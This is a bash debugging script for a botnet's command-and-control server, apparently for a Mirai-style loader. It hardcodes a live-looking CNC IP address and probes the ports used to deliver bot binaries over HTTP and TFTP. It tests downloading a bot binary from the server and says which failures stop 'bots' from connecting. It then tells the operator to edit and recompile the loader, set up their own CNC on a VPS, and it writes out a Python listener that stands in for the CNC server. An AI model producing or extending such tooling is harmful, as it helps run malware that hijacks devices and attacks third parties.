#!/bin/bash

# Debug script to diagnose CNC connection issues
echo "=== CNC Connection Debug Tool ==="

# Configuration
CNC_SERVER="185.247.117.214"
CNC_PORT="666"
CNC_HTTP_PORT="80"
CNC_TFTP_PORT="69"

echo "Checking CNC server configuration:"
echo "CNC Server: $CNC_SERVER"
echo "CNC Port: $CNC_PORT"
echo "HTTP Port: $CNC_HTTP_PORT"
echo "TFTP Port: $CNC_TFTP_PORT"
echo ""

# Function to test network connectivity
test_connectivity() {
    local host="$1"
    local port="$2"
    local service="$3"
    
    echo "Testing $service connectivity to $host:$port..."
    
    # Test with timeout
    if timeout 5 bash -c "</dev/tcp/$host/$port" 2>/dev/null; then
        echo "✓ $service connection to $host:$port is OPEN"
        return 0
    else
        echo "✗ $service connection to $host:$port is CLOSED or FILTERED"
        return 1
    fi
}

# Function to check if CNC server is reachable
check_cnc_server() {
    echo "=== CNC Server Connectivity Test ==="
    
    # Test main CNC port
    test_connectivity "$CNC_SERVER" "$CNC_PORT" "CNC"
    
    # Test HTTP port (for wget downloads)
    test_connectivity "$CNC_SERVER" "$CNC_HTTP_PORT" "HTTP"
    
    # Test TFTP port (for tftp downloads)
    test_connectivity "$CNC_SERVER" "69" "TFTP"
    
    echo ""
}

# Function to check if CNC server is listening
check_cnc_listening() {
    echo "=== Checking if CNC server is listening ==="
    
    # Check if we can connect to the CNC server
    if nc -z "$CNC_SERVER" "$CNC_PORT" 2>/dev/null; then
        echo "✓ CNC server is listening on $CNC_SERVER:$CNC_PORT"
    else
        echo "✗ CNC server is NOT listening on $CNC_SERVER:$CNC_PORT"
        echo "  This is likely the main issue!"
    fi
    
    # Check HTTP server
    if nc -z "$CNC_SERVER" "$CNC_HTTP_PORT" 2>/dev/null; then
        echo "✓ HTTP server is listening on $CNC_SERVER:$CNC_HTTP_PORT"
    else
        echo "✗ HTTP server is NOT listening on $CNC_SERVER:$CNC_HTTP_PORT"
    fi
    
    echo ""
}

# Function to check binary availability
check_binary_availability() {
    echo "=== Checking Binary Availability ==="
    
    # Test HTTP download of binaries
    echo "Testing binary download from HTTP server..."
    
    # Test if we can download a binary file
    if curl -s --connect-timeout 5 "http://$CNC_SERVER:$CNC_HTTP_PORT/bins/static.x86" > /dev/null 2>&1; then
        echo "✓ Binary download from HTTP server works"
    else
        echo "✗ Binary download from HTTP server FAILED"
        echo "  This could be why bots don't connect to CNC"
    fi
    
    echo ""
}

# Function to check network routing
check_network_routing() {
    echo "=== Network Routing Check ==="
    
    # Check if we can reach the CNC server
    if ping -c 3 -W 3 "$CNC_SERVER" > /dev/null 2>&1; then
        echo "✓ CNC server is reachable via ping"
    else
        echo "✗ CNC server is NOT reachable via ping"
        echo "  This could be a routing or firewall issue"
    fi
    
    # Check DNS resolution
    if nslookup "$CNC_SERVER" > /dev/null 2>&1; then
        echo "✓ DNS resolution for CNC server works"
    else
        echo "✗ DNS resolution for CNC server FAILED"
    fi
    
    echo ""
}

# Function to check firewall rules
check_firewall() {
    echo "=== Firewall Check ==="
    
    # Check if we can connect to the CNC port
    if timeout 5 bash -c "echo > /dev/tcp/$CNC_SERVER/$CNC_PORT" 2>/dev/null; then
        echo "✓ Firewall allows connection to CNC port"
    else
        echo "✗ Firewall BLOCKS connection to CNC port"
        echo "  This is likely why bots can't connect to CNC"
    fi
    
    echo ""
}

# Function to suggest solutions
suggest_solutions() {
    echo "=== Suggested Solutions ==="
    echo ""
    echo "If CNC server is not reachable, try these solutions:"
    echo ""
    echo "1. CHECK CNC SERVER STATUS:"
    echo "   - Verify the CNC server at $CNC_SERVER is running"
    echo "   - Check if it's listening on port $CNC_PORT"
    echo "   - Ensure the CNC server is accessible from the internet"
    echo ""
    echo "2. UPDATE CNC SERVER ADDRESS:"
    echo "   - Edit /root/loader/src/headers/config.h"
    echo "   - Change HTTP_SERVER and TFTP_SERVER to your actual CNC server"
    echo "   - Recompile the loader with: make -f Makefile_debug"
    echo ""
    echo "3. CHECK NETWORK CONFIGURATION:"
    echo "   - Ensure your CNC server has proper firewall rules"
    echo "   - Check if the CNC server is behind NAT/firewall"
    echo "   - Verify port forwarding if needed"
    echo ""
    echo "4. TEST CNC SERVER MANUALLY:"
    echo "   - Try connecting to CNC server: telnet $CNC_SERVER $CNC_PORT"
    echo "   - Check if CNC server logs show connection attempts"
    echo "   - Verify the CNC server is configured to accept connections"
    echo ""
    echo "5. ALTERNATIVE CNC SERVERS:"
    echo "   - Use a different CNC server that you control"
    echo "   - Set up your own CNC server on a VPS"
    echo "   - Use a public CNC server that's known to work"
    echo ""
}

# Function to create a test CNC server
create_test_cnc() {
    echo "=== Creating Test CNC Server ==="
    
    echo "Creating a simple test CNC server on port $CNC_PORT..."
    
    # Create a simple test CNC server script
    cat > /root/loader/test_cnc_server.py << 'EOF'
#!/usr/bin/env python3
import socket
import threading
import time

def handle_client(client_socket, address):
    print(f"Connection from {address}")
    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            print(f"Received from {address}: {data.decode('utf-8', errors='ignore')}")
            # Send acknowledgment
            client_socket.send(b"ACK\n")
    except Exception as e:
        print(f"Error handling client {address}: {e}")
    finally:
        client_socket.close()
        print(f"Connection closed: {address}")

def start_cnc_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"CNC server listening on {host}:{port}")
    
    while True:
        client_socket, address = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
        client_thread.daemon = True
        client_thread.start()

if __name__ == "__main__":
    start_cnc_server("0.0.0.0", 666)
EOF

    chmod +x /root/loader/test_cnc_server.py
    
    echo "Test CNC server script created: /root/loader/test_cnc_server.py"
    echo "To start it: python3 /root/loader/test_cnc_server.py"
    echo ""
}

# Function to check current CNC connections
check_current_connections() {
    echo "=== Current CNC Connections ==="
    
    # Check for active connections to CNC port
    local cnc_connections=$(ss -tn | grep ":$CNC_PORT" | wc -l)
    echo "Active connections to CNC port $CNC_PORT: $cnc_connections"
    
    if [ $cnc_connections -gt 0 ]; then
        echo "Current CNC connections:"
        ss -tn | grep ":$CNC_PORT"
    else
        echo "No active connections to CNC port"
    fi
    
    echo ""
}

# Main execution
echo "Starting CNC connection diagnostics..."
echo ""

# Run all checks
check_cnc_server
check_cnc_listening
check_binary_availability
check_network_routing
check_firewall
check_current_connections

# Provide solutions
suggest_solutions

# Create test CNC server
create_test_cnc

echo "=== Debug Complete ==="
echo "Check the results above to identify the issue with CNC connections."
echo "The most common issues are:"
echo "1. CNC server is not running or not accessible"
echo "2. Firewall blocking connections to CNC port"
echo "3. Wrong CNC server address in configuration"
echo "4. Network routing issues"
